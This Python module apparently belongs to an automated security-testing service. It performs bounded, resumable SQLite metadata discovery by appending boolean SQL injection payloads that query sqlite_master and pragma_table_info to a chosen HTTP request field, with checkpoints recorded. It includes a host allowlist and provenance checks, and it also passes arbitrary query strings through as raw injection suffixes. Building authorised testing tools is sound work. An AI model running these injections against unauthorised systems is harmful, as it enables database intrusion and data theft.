"""Bounded, resumable SQLite metadata discovery."""

from __future__ import annotations

import hashlib
import json
import re
from datetime import UTC, datetime
from typing import Any

from fastapi import HTTPException

from app.executors.boolean_config_extract import _set_field, _spec, _oracle
from app.executors.http_executor import execute_http
from app.executors.target_allowlist import target_allowed
from app.models import JobRequest
from app.workspace.paths import workspace_for


def _provenance(args: dict[str, Any]) -> None:
    required = ("target_expression", "expression_type", "supporting_evidence_ids", "supporting_fact_ids", "source_hypothesis_id", "approved_analysis_review_id", "assumption_status")
    if any(key not in args for key in required) or args.get("expression_type") != "METADATA_DISCOVERY" or args.get("assumption_status") not in {"VERIFIED", "HYPOTHESIS"}:
        raise HTTPException(422, detail="SQL_EXPRESSION_PROVENANCE_REQUIRED: SQLite metadata discovery requires a sourced expression")
    if not args.get("supporting_evidence_ids") or not args.get("supporting_fact_ids") or not args.get("source_hypothesis_id") or not args.get("approved_analysis_review_id"):
        raise HTTPException(422, detail="SQL_EXPRESSION_PROVENANCE_REQUIRED: incomplete evidence sources")


def _hash(value: Any) -> str:
    return hashlib.sha256(json.dumps(value, ensure_ascii=False, sort_keys=True, default=str).encode()).hexdigest()


def _extract_tables(result: dict[str, Any]) -> list[dict[str, str]]:
    body = str(result.get("body") or result.get("body_excerpt") or "")
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = {}
    rows = parsed.get("tables") if isinstance(parsed, dict) else None
    if isinstance(rows, list):
        return [{"name": str(item.get("name") or item), "sql": str(item.get("sql") or "")} for item in rows if isinstance(item, (dict, str)) and str(item.get("name") if isinstance(item, dict) else item)]
    found = []
    for name, sql in re.findall(r"(?i)(?:table\s*[:=]\s*|name\"?\s*:\s*\"?)([A-Za-z_][A-Za-z0-9_]*)[^\r\n]{0,20}(?:sql\"?\s*[:=]\s*\"([^\"\r\n]*)\")?", body):
        if name not in {"sqlite_sequence"} and not name.startswith("sqlite_stat"):
            found.append({"name": name, "sql": sql})
    return found


def _extract_columns(result: dict[str, Any]) -> list[dict[str, str]]:
    body = str(result.get("body") or result.get("body_excerpt") or "")
    try:
        parsed = json.loads(body)
    except json.JSONDecodeError:
        parsed = {}
    rows = parsed.get("columns") if isinstance(parsed, dict) else None
    if not isinstance(rows, list):
        return []
    return [
        {"table": str(item.get("table") or ""), "name": str(item.get("name") or item.get("column") or ""), "type": str(item.get("type") or "")}
        for item in rows
        if isinstance(item, dict) and str(item.get("name") or item.get("column") or "")
    ]


async def sqlite_metadata_discovery(request: JobRequest) -> dict[str, Any]:
    args = dict(request.arguments)
    _provenance(args)
    spec = _spec(args)
    field = str(args.get("test_field") or "")
    if not spec.get("url") or not field:
        raise HTTPException(422, detail="request.url and test_field are required")
    if not target_allowed(spec["url"], request.allowed_hosts):
        raise HTTPException(403, detail="SQLite metadata target is not allowlisted")
    root = workspace_for(request.run_id)
    job_id = str(args.get("job_id") or "unknown")
    output = root / "outputs" / "sqlite-metadata" / job_id
    evidence = root / "evidence" / "sqlite-metadata" / job_id
    output.mkdir(parents=True, exist_ok=True)
    evidence.mkdir(parents=True, exist_ok=True)
    progress_path, checkpoint_path, result_path = output / "progress.jsonl", output / "checkpoint.json", output / "result.json"
    request_contract_path = evidence / "request-contract.json"
    request_contract_path.write_text(json.dumps({"run_id": request.run_id, "job_id": job_id, "stage": str(args.get("stage") or "identify"), "request": spec, "target_expression": args.get("target_expression"), "provenance": {key: args.get(key) for key in ("expression_type", "supporting_evidence_ids", "supporting_fact_ids", "source_hypothesis_id", "approved_analysis_review_id", "assumption_status")}}, ensure_ascii=False, indent=2), encoding="utf-8")
    max_requests = min(max(int(args.get("max_requests") or 8), 1), 32)
    stage = str(args.get("stage") or "identify").lower()
    templates = list(args.get("queries") or [
        "sqlite_version", "sqlite_master_tables", "sqlite_table_info",
    ])[:max_requests]
    checkpoint = {}
    if bool(args.get("resume")) and checkpoint_path.is_file():
        try:
            checkpoint = json.loads(checkpoint_path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            checkpoint = {}
    start = int(checkpoint.get("position") or 0) if checkpoint.get("request_hash") == _hash(spec) else 0
    rows: list[dict[str, str]] = list(checkpoint.get("tables") or []) if start else []
    columns: list[dict[str, str]] = list(checkpoint.get("columns") or []) if start else []
    if stage in {"structure", "columns"}:
        selected_tables = [str(item.get("name") or "") for item in rows]
        selected_tables.extend(str(item) for item in (args.get("tables") or []) if str(item))
        selected_tables = list(dict.fromkeys(item for item in selected_tables if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", item) and item not in {"sqlite_sequence"} and not item.startswith("sqlite_stat")))
        templates = [f"pragma_table_info:{item}" for item in selected_tables][:max_requests]
    progress: list[dict[str, Any]] = []
    for position, query_name in enumerate(templates[start:], start + 1):
        suffix = {
            "sqlite_version": "' AND sqlite_version() IS NOT NULL -- ",
            "sqlite_master_tables": "' AND (SELECT count(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%') >= 0 -- ",
            "sqlite_table_info": "' AND (SELECT count(*) FROM sqlite_master WHERE type='table') >= 0 -- ",
        }.get(str(query_name), f"' AND (SELECT count(*) FROM pragma_table_info('{str(query_name).split(':', 1)[1]}')) >= 0 -- " if str(query_name).startswith("pragma_table_info:") else str(query_name))
        candidate = _set_field(spec, field, str(args.get("baseline_value") or "") + suffix)
        result = await execute_http(request.model_copy(update={"tool": "http_request", "arguments": candidate}))
        discovered = _extract_tables(result)
        rows.extend(item for item in discovered if item["name"] not in {row["name"] for row in rows})
        columns.extend(item for item in _extract_columns(result) if item not in columns)
        entry = {"position": position, "stage": stage, "query": str(query_name), "status_code": result.get("status_code"), "tables_found": len(rows), "columns_found": len(columns), "at": datetime.now(UTC).isoformat()}
        progress.append(entry)
        progress_path.write_text("".join(json.dumps(item, ensure_ascii=False) + "\n" for item in progress), encoding="utf-8")
        checkpoint_path.write_text(json.dumps({"status": "PARTIAL", "stage": stage, "position": position, "request_hash": _hash(spec), "tables": rows, "columns": columns, "query_names": templates}, ensure_ascii=False, indent=2), encoding="utf-8")
    result_payload = {"status": "COMPLETED", "summary": "Bounded SQLite metadata discovery completed", "structured_result": {"database_engine": "sqlite", "stage": stage, "tables": rows, "columns": columns, "system_tables_excluded": ["sqlite_sequence", "sqlite_stat*"], "next_stage": "PRAGMA_TABLE_INFO_OR_BOUNDED_EXTRACTION", "provenance": {key: args[key] for key in ("target_expression", "expression_type", "supporting_evidence_ids", "supporting_fact_ids", "source_hypothesis_id", "approved_analysis_review_id", "assumption_status")}}, "artifact_paths": [str(progress_path.relative_to(root)).replace("\\", "/"), str(checkpoint_path.relative_to(root)).replace("\\", "/"), str(result_path.relative_to(root)).replace("\\", "/"), str(request_contract_path.relative_to(root)).replace("\\", "/")], "progress_path": str(progress_path.relative_to(root)).replace("\\", "/"), "checkpoint_path": str(checkpoint_path.relative_to(root)).replace("\\", "/"), "result_path": str(result_path.relative_to(root)).replace("\\", "/")}
    result_path.write_text(json.dumps(result_payload, ensure_ascii=False, indent=2), encoding="utf-8")
    checkpoint_path.write_text(json.dumps({"status": "COMPLETED", "stage": stage, "position": len(templates), "request_hash": _hash(spec), "tables": rows, "columns": columns, "query_names": templates}, ensure_ascii=False, indent=2), encoding="utf-8")
    return result_payload
